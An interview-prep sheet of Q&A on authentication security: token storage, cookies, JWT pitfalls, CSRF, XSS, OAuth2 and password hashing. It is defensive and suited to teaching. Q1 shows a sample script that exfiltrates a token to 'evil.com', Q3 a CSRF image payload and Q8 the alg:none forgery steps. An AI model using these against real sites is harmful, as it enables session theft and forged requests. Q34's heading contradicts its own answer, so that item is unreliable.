# Auth Security — Tricky Interview Questions

Token storage, cookies, JWT, XSS, CSRF, session management. Answer before reading.

---

## Q1 — Why should you NOT store auth tokens in localStorage?

**Answer:** localStorage is accessible by **any JavaScript running on the page**. If your app has an XSS vulnerability (even via a third-party script, ad, or npm package), an attacker can do:

```js
// Attacker's injected script
fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'));
```

The token is silently exfiltrated and the attacker gets full API access until the token expires.

**Why this matters:** XSS is extremely common — stored XSS, reflected XSS, DOM XSS, supply chain attacks (compromised npm package). You can't fully prevent XSS; you can reduce impact by keeping tokens out of JS-accessible storage.

---

## Q2 — How are HttpOnly cookies different from localStorage for token storage?

**Answer:**

| | localStorage / sessionStorage | HttpOnly Cookie |
|---|---|---|
| JS readable | ✅ yes — `localStorage.getItem()` | ❌ no — browser blocks JS access |
| XSS exposure | High — token stolen immediately | Low — cookie sent but not readable |
| CSRF exposure | None — JS must explicitly send it | High — browser auto-sends on requests |
| Sent automatically | No — must attach manually | Yes — browser sends on every matching request |
| Expiry control | Manual | `Max-Age` / `Expires` header |
| Domain/path scope | Origin only | Configurable |

`HttpOnly` cookies cannot be read by `document.cookie` or any JS API. An XSS attacker can still make requests *using* the cookie, but can't steal the token itself.

---

## Q3 — If HttpOnly cookies block XSS theft, what attack is still possible?

**Answer:** **CSRF (Cross-Site Request Forgery).**

Because the browser automatically attaches cookies to every matching request, an attacker on `evil.com` can make the victim's browser send authenticated requests to `yourbank.com`:

```html
<!-- On evil.com -->
<img src="https://yourbank.com/api/transfer?to=attacker&amount=1000" />
<!-- Browser sends cookie automatically — authenticated request! -->
```

**Mitigation:**
1. `SameSite=Strict` or `SameSite=Lax` cookie attribute (modern, preferred)
2. CSRF token in a custom request header (double-submit cookie pattern)
3. Check `Origin` / `Referer` headers server-side

---

## Q4 — What does `SameSite=Lax` do?

**Answer:** It restricts the cookie to:
- Same-site requests (always sent)
- Top-level navigations using safe methods (GET links — sent)
- Cross-site subresource requests, forms, AJAX — **not sent**

```
Set-Cookie: token=abc; SameSite=Lax; HttpOnly; Secure
```

This blocks most CSRF attacks (the `<img>` example above would not send the cookie). `Strict` is even more restrictive — doesn't send on any cross-site request, including navigations from external links (breaks some UX). `None` allows cross-site but requires `Secure`.

---

## Q5 — What is the ideal cookie configuration for an auth token?

```
Set-Cookie: access_token=<jwt>;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Path=/api;
  Max-Age=900
```

**Breakdown:**
- `HttpOnly` — JS cannot read it
- `Secure` — only sent over HTTPS (never plain HTTP)
- `SameSite=Strict` — not sent on cross-site requests → blocks CSRF
- `Path=/api` — only sent to `/api/*`, not leaked to third-party resources
- `Max-Age=900` — expires in 15 min (short-lived access token)

---

## Q6 — What is the difference between an access token and a refresh token?

**Answer:**

| | Access Token | Refresh Token |
|---|---|---|
| Lifetime | Short (5–15 min) | Long (days/weeks) |
| Sent on | Every API request | Only to `/auth/refresh` |
| If stolen | Attacker has access until expiry | Attacker can mint new access tokens |
| Storage | Memory (JS var) or HttpOnly cookie | HttpOnly cookie only |
| Revocable | Not easily (stateless JWT) | Yes — server can blacklist |

**Pattern:** Store the refresh token in an HttpOnly cookie (short path `/auth`). Keep the access token in memory (a JS variable) — it's gone on page refresh, which is fine since you can get a new one silently using the refresh token.

---

## Q7 — Can you tell if a JWT is tampered with just by looking at it?

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Answer:** The header and payload are just **base64url-encoded**, not encrypted. Anyone can decode them:

```js
atob('eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0')
// → '{"userId":1,"role":"user"}'
```

Tampering is prevented by the **signature** — but the signature only proves the payload wasn't changed *if you verify it on the server*. The signature uses a secret key (HMAC) or private key (RSA/EC). If verification is skipped, the token is worthless as a security mechanism.

---

## Q8 — What is the `alg: none` JWT attack?

**Answer:** Early JWT libraries accepted `{ "alg": "none" }` in the header, which meant "no signature needed." An attacker could:
1. Decode any JWT
2. Modify the payload (e.g., change `"role": "user"` to `"role": "admin"`)
3. Re-encode with `alg: none` and no signature
4. Send the forged token

Servers using vulnerable libraries accepted it. **Fix:** Never accept `alg: none`. Explicitly specify the expected algorithm when verifying:
```js
jwt.verify(token, secret, { algorithms: ['HS256'] }); // not ['none']
```

---

## Q9 — What is the RS256 vs HS256 difference and when does it matter?

| | HS256 | RS256 |
|---|---|---|
| Algorithm | HMAC-SHA256 (symmetric) | RSA-SHA256 (asymmetric) |
| Sign key | Shared secret | Private key |
| Verify key | Same shared secret | Public key |
| Who can verify | Anyone with the secret | Anyone with the public key |
| Use case | Single server or trusted internal | Microservices, third-party consumers |

**When it matters:** If you have microservices that need to verify tokens but should NOT be able to issue them, RS256 is the right choice — give them the public key only. With HS256, every service that verifies tokens also has the secret and could forge tokens.

---

## Q10 — Should JWT expiry alone be enough to secure your API?

**Answer:** **No.** Problems:
1. **Cannot revoke** a non-expired JWT without a server-side denylist
2. **Token theft window** — if a 1-hour JWT is stolen at minute 1, attacker has 59 minutes
3. **No account for logout** — calling `logout()` on the client doesn't invalidate the token server-side

**Mitigations:**
- Short expiry (5–15 min) for access tokens
- Refresh token rotation with revocation on server
- Token denylist (Redis set) for critical actions (password change, account deactivation)
- `jti` (JWT ID) claim for per-token revocation

---

## Q11 — What is token rotation and why is it important for refresh tokens?

**Answer:** On each use of a refresh token, the server:
1. Issues a new refresh token
2. Invalidates the old one

```
Client → POST /auth/refresh { refreshToken: "rt_abc" }
Server → { accessToken: "...", refreshToken: "rt_xyz" }
         (rt_abc is now invalid)
```

**Why:** If `rt_abc` was stolen and an attacker uses it, the legitimate client's next refresh attempt will fail (token already rotated). This detects token theft. With **refresh token families** (tracking lineage), if a previously-rotated token is reused, the server can revoke the entire family.

---

## Q12 — What is the difference between authentication and authorization?

**Answer:**
- **Authentication (AuthN):** Verifying *who* you are — "Are you really Alice?" (login, JWT verification)
- **Authorization (AuthZ):** Verifying *what* you can do — "Is Alice allowed to delete this resource?" (RBAC, ABAC, permissions)

Common mistake: checking "is the token valid?" (AuthN) but forgetting to check "does this user own this resource?" (AuthZ).

```js
// Bug: only verifies token is valid — not that user owns the resource
app.delete('/posts/:id', verifyJWT, async (req, res) => {
  await db.deletePost(req.params.id); // any authenticated user can delete any post!
});

// Fix: also verify ownership
app.delete('/posts/:id', verifyJWT, async (req, res) => {
  const post = await db.getPost(req.params.id);
  if (post.userId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
  await db.deletePost(req.params.id);
});
```

---

## Q13 — What is an IDOR vulnerability?

**Answer:** **Insecure Direct Object Reference** — accessing a resource by guessing or manipulating its identifier without proper authorization check.

```
GET /api/invoices/1001  → attacker changes to /api/invoices/1002
```

If the server only checks "is user logged in?" and not "does user own invoice 1002?", the attacker reads another user's invoice. Fix: always scope queries to `req.user.id`.

---

## Q14 — What is the `Secure` flag on a cookie and when can you omit it?

**Answer:** `Secure` means the cookie is only sent over HTTPS. Without it, the cookie (including the auth token) can be sent over plain HTTP and intercepted by a man-in-the-middle.

You can omit it only in local development (`localhost` is treated as secure by browsers). **Never omit it in production.**

---

## Q15 — What does `SameSite=None; Secure` mean and when is it used?

**Answer:** It allows the cookie to be sent on cross-site requests (e.g., from `app.com` to `api.company.com`). Required `Secure` is mandatory when using `None`.

**Use case:** Your frontend is on `app.example.com` and your API is on `api.example.com` (different subdomains = cross-site in some browsers), or you're building a widget/iframe embedded in third-party pages.

**Risk:** Re-enables CSRF — must implement CSRF tokens or custom header checks when using `SameSite=None`.

---

## Q16 — How do you prevent XSS in a React app?

**Answer:**
1. **React auto-escapes** JSX — `{userInput}` is safe by default
2. **Never use `dangerouslySetInnerHTML`** without sanitizing (use `DOMPurify`)
3. **Content Security Policy (CSP)** header — whitelist script sources, block inline scripts
4. **Avoid `eval()`, `new Function()`, `innerHTML`**
5. **Sanitize user-controlled URLs** — `javascript:` protocol in `href`/`src` is XSS
6. **Audit npm dependencies** — `npm audit`, lock file integrity
7. **`HttpOnly` cookies** — limits XSS blast radius (can't steal token)

---

## Q17 — What is a Content Security Policy and how does it help?

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none';
```

**Answer:** CSP is an HTTP header that tells the browser which sources are trusted for scripts, styles, images, etc. Even if an attacker injects a `<script>` tag, the browser won't execute it if its source isn't whitelisted.

**Levels of protection:**
- `script-src 'self'` — only scripts from same origin
- `'nonce-{random}'` — only scripts with matching nonce attribute
- `'strict-dynamic'` — trust scripts loaded by trusted scripts

CSP is a defense-in-depth layer — it reduces XSS damage, doesn't eliminate the root cause.

---

## Q18 — What is the double-submit cookie CSRF protection pattern?

**Answer:** When you can't use `SameSite` (legacy browsers or cross-site cookies):

1. Server sets a random CSRF token in a **non-HttpOnly** cookie (JS-readable)
2. Client reads it and sends it in a **custom request header** (`X-CSRF-Token`)
3. Server verifies the header value matches the cookie value

An attacker's cross-site form can trigger cookie sending, but can't read the cookie (SOP) and thus can't set the header. The double-submit proves the request originated from your JS code.

---

## Q19 — What happens if you store the JWT in a JS variable (memory)?

**Answer:**
- **Pro:** Not accessible by XSS (no persistent storage) — safest against token theft
- **Con:** Lost on page refresh — user must re-authenticate or silently refresh via HttpOnly refresh token cookie
- **Con:** Not shared across tabs (each tab has its own memory)

**Pattern:** Keep access token in memory, refresh token in HttpOnly cookie. On app load, call `/auth/refresh` silently to get a new access token.

```js
let accessToken = null; // in memory only

async function getAccessToken() {
  if (!accessToken || isExpired(accessToken)) {
    const res = await fetch('/auth/refresh', { credentials: 'include' }); // sends HttpOnly cookie
    accessToken = (await res.json()).accessToken;
  }
  return accessToken;
}
```

---

## Q20 — What is OAuth2 and how is it different from JWT?

**Answer:**
- **OAuth2** is an *authorization framework* — defines flows for delegating access (authorization code, client credentials, implicit, device). It's about *how* tokens are obtained.
- **JWT** is a *token format* — a self-contained, signed JSON payload. It's about *what* the token looks like.

They're orthogonal: OAuth2 can issue JWTs, opaque tokens, or anything else. JWTs can be used with or without OAuth2.

```
OAuth2 flow:
User → authorize on Identity Provider → gets authorization code
App → exchanges code for access_token (JWT or opaque) + refresh_token
App → uses access_token to call API
```

---

## Q21 — What is PKCE and why is it required for public clients?

**Answer:** **Proof Key for Code Exchange** — prevents authorization code interception attacks.

Without PKCE, if a malicious app intercepts the authorization code (via URL redirection), it can exchange it for tokens.

With PKCE:
1. Client generates a random `code_verifier`
2. Client sends `code_challenge = SHA256(code_verifier)` with the auth request
3. After redirect, client sends the original `code_verifier` with the token exchange
4. Auth server verifies `SHA256(code_verifier) === code_challenge`

An interceptor has the code but not the `code_verifier` — can't exchange it.

**Required for:** SPAs (public clients, no client secret), mobile apps. Server-side apps with a client secret don't strictly need it but should still use it.

---

## Q22 — What is the difference between session-based auth and token-based auth?

| | Session (stateful) | Token/JWT (stateless) |
|---|---|---|
| Server stores | Session data in DB/Redis | Nothing (self-contained) |
| Revocation | Instant — delete session | Hard — wait for expiry |
| Horizontal scaling | Needs sticky sessions or shared store | Easy — any server can verify |
| Bandwidth | Small session ID cookie | JWT payload size (typically 200-500 bytes) |
| Logout | Always works | Requires denylist for immediate effect |

**Sessions are better for:** applications requiring instant revocation (banking, admin panels), simple architectures.

**JWTs are better for:** microservices, APIs consumed by mobile apps, stateless scaling.

---

## Q23 — What is a timing attack in authentication and how do you prevent it?

**Answer:** If your password comparison returns immediately on the first mismatch, an attacker can measure response times to guess characters one by one.

```js
// Vulnerable — short-circuits
if (providedPassword === storedPassword) { ... }

// Vulnerable — timing leaks character by character
for (let i = 0; i < password.length; i++) {
  if (password[i] !== stored[i]) return false;
}
```

**Fix:** Use a **constant-time comparison** function (always runs full length regardless of where mismatch occurs):
```js
const crypto = require('crypto');
crypto.timingSafeEqual(
  Buffer.from(provided),
  Buffer.from(stored)
);

// Or use bcrypt.compare() which is already constant-time
await bcrypt.compare(plaintext, hash);
```

---

## Q24 — Why should you hash passwords with bcrypt (not SHA256/MD5)?

**Answer:** General-purpose hash functions (SHA256, MD5) are designed to be **fast** — millions of hashes per second on a GPU. This makes brute-force and rainbow table attacks cheap.

**bcrypt** is intentionally **slow** — it has a cost factor:
```js
const hash = await bcrypt.hash(password, 12); // 2^12 = 4096 iterations
// Takes ~250ms per hash — fine for login, catastrophic for brute-force
```

Other good choices: **Argon2id** (recommended by OWASP, memory-hard), **scrypt** (memory-hard).

**Never use:** MD5, SHA1, SHA256, SHA512 alone for passwords.

---

## Q25 — What is the `SameSite` cookie default in modern browsers?

**Answer:** As of Chrome 80+ (2020), the default is `SameSite=Lax` if not specified. This means:
- Cross-site AJAX, iframes, and subresource requests won't send the cookie
- Top-level navigation (clicking a link) will send the cookie on GET

This breaks apps that relied on cross-site cookies without `SameSite=None; Secure`. Many old backend sessions broke when this default changed.

---

## Q26 — What is a `__Host-` cookie prefix and what does it enforce?

```
Set-Cookie: __Host-token=abc; Secure; HttpOnly; Path=/; SameSite=Strict
```

**Answer:** The `__Host-` prefix enforces three rules the browser checks:
1. Cookie must have the `Secure` flag
2. Cookie must not have a `Domain` attribute (can't be shared with subdomains)
3. Cookie `Path` must be `/`

This prevents subdomain takeover attacks — even if `attacker.yourdomain.com` sets a cookie, the `__Host-` prefix prevents it from overriding the main domain's cookie.

---

## Q27 — What is subdomain cookie isolation and why does it matter?

**Answer:** Cookies without a `Domain` attribute are only sent to the exact host that set them. Cookies with `Domain=example.com` are sent to `example.com` **and all subdomains** (`api.example.com`, `cdn.example.com`).

If `cdn.example.com` is compromised or runs untrusted content, it can read cookies scoped to `.example.com`. Fix: don't set `Domain` (or use `__Host-` prefix), and use the strictest path possible.

---

## Q28 — Can an HttpOnly cookie be stolen by XSS?

**Answer:** The token value **cannot be read** — `document.cookie` won't show it. But an XSS attacker can still:
1. Make **authenticated API requests** using the cookie (browser sends it automatically)
2. Use `fetch('/api/sensitive', { credentials: 'include' })` — CSRF-style attack from the victim's browser

So HttpOnly protects against token *theft* (exfiltration), but not against attackers *using* the session in-browser. This is why you still need CSP, input sanitization, and XSS prevention even with HttpOnly cookies.

---

## Q29 — What is the purpose of the `nonce` in JWT or OAuth2?

**Answer:** A `nonce` (number used once) is a random value:

- **JWT (OpenID Connect):** Client sends a nonce in the auth request; the ID token includes it. Client verifies the nonce matches — prevents replay attacks (attacker recording and replaying a valid auth response).
- **OAuth2 state parameter:** Random value sent in auth request and returned in redirect — prevents CSRF on the OAuth flow itself (attacker tricking user's browser to start the OAuth flow to attacker's app).
- **CSP:** `<script nonce="randomvalue">` — inline scripts need the matching nonce to execute.

---

## Q30 — What is "token binding" and why isn't it widely used?

**Answer:** Token binding cryptographically binds a token to a specific TLS connection — the token can only be used on the same TLS channel it was issued on. An attacker who steals the token can't replay it from a different connection.

**Why not widely used:** Requires browser + server support. Removed from Chrome in 2022 (too complex, too few adopters). The simpler alternative is short-lived tokens + refresh token rotation.

---

## Q31 — What is the "confused deputy" problem in OAuth2?

**Answer:** The confused deputy is an entity with legitimate authority being tricked into using that authority on behalf of an attacker.

In OAuth2, if your server accepts access tokens from multiple OAuth providers for the same API, an attacker who gets a valid token from Provider A might be able to use it against your API if you only check the signature and not the `audience` (`aud`) claim.

**Fix:** Always verify the `aud` (audience) claim matches your API identifier:
```js
jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
  audience: 'https://api.yourapp.com', // MUST match
});
```

---

## Q32 — What is the difference between opaque tokens and JWTs?

| | Opaque Token | JWT |
|---|---|---|
| Format | Random string (e.g., UUID) | Signed JSON (self-contained) |
| Validation | Must call introspection endpoint | Verify signature locally |
| Revocation | Instant (delete from DB) | Hard (wait for expiry) |
| Privacy | No data exposed | Payload is decoded by anyone |
| Size | Small | Larger (payload + signature) |
| Network call | Required per validation | Not required |

**Use opaque tokens when:** you need instant revocation, privacy matters (no claims in transit), or you're using a traditional session model.

**Use JWTs when:** you need stateless validation across multiple services, or the token is verified by third parties.

---

## Q33 — What is the `iss`, `sub`, `aud`, `exp`, `iat`, `jti` JWT claims?

```json
{
  "iss": "https://auth.example.com",    // issuer — who created the token
  "sub": "user_123",                    // subject — who the token is about
  "aud": "https://api.example.com",     // audience — intended recipient
  "exp": 1700000000,                    // expiry (Unix timestamp)
  "iat": 1699999100,                    // issued at
  "jti": "550e8400-e29b-41d4-a716-..."  // JWT ID — for revocation / replay prevention
}
```

**Verification checklist:**
1. Signature is valid (correct algorithm, correct key)
2. `exp` is in the future
3. `iss` matches your expected issuer
4. `aud` matches your API identifier
5. (Optional) `jti` not in revocation denylist

---

## Q34 — Why is `localStorage` slightly better than `sessionStorage` for token security but both are bad?

**Answer:** Neither is safe for tokens, but:
- `sessionStorage` is cleared when the tab closes — shorter attack window
- `localStorage` persists across tabs and sessions — longer window for exfiltration

Both are **equally vulnerable to XSS** — any JS on the page can read either. The distinction is attack duration, not attack vector. The right answer is: don't store tokens in either.

---

## Q35 — How would you implement "remember me" securely?

**Answer:** "Remember me" means keeping a user logged in across browser sessions. Implementation:

1. On login with "remember me" checked, issue a **long-lived refresh token** (e.g., 30 days)
2. Store it in an `HttpOnly; Secure; SameSite=Strict` cookie with `Max-Age=2592000`
3. Short-lived access token (15 min) stays in memory
4. On app load, silently call `/auth/refresh` using the cookie
5. Use **refresh token rotation** — every refresh issues a new refresh token
6. On explicit logout: delete the cookie server-side, invalidate the token in DB

**Risks to mitigate:** device theft (allow users to see/revoke active sessions), token theft (rotation detects reuse).

---
